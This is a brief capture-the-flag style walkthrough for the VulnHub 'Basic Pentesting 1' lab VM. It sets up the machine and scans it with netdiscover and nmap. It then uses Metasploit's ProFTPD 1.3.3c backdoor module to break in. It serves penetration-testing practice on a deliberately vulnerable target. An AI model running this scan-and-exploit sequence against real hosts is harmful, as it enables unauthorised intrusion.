# Basic-Pentesting-1-VulnHub

- Go to the link : **https://www.vulnhub.com/entry/basic-pentesting-1,216/**
- Download the __.ova__ file
- Download Virtual Box : **https://www.virtualbox.org/wiki/Downloads**
- In VirtualBox, to import the __.ova__ file head to *File → Import Appliance*
- Make sure to check for the network adapter *Network → Bridged Adapter*

---

Now open your Kali Linux (Boot or VM)
- In terminal check Machine IP of connected devices using 
    ```
    sudo netdiscover
    ```
- Save the vulnerable device IP in a file

    ```
    IP > csec_ip
    ```
- Check the services using nmap

    ```
    nmap -A -vv -iL csec_ip > csec_scan_output.txt
    ```
- Check the exploits using MetaSploit
  - Metasploit is a framework used for modular penetration testing platform that enables to write, test and execute exploit code
  - Contains updated exploits of the protocols etc

    ```
    msfconsole
    ```
- Search exploits in Metasploit
    
    ```bash
    search proftpd
    ```
    
    - Check the version and exploit
        
        ```bash
        use NAME_OF_EXPLOIT
        ```
        
        ```bash
        use exploit/unix/ftp/proftpd_133c_backdoor
        ```
        
        ```bash
        info
        ```
        
    - Check target Machine IP in the file and set as RHOST
        
        ```bash
        set RHOST IP
        ```
        
    - Now exploit the vulnerability
        
        ```bash
        exploit
        ```
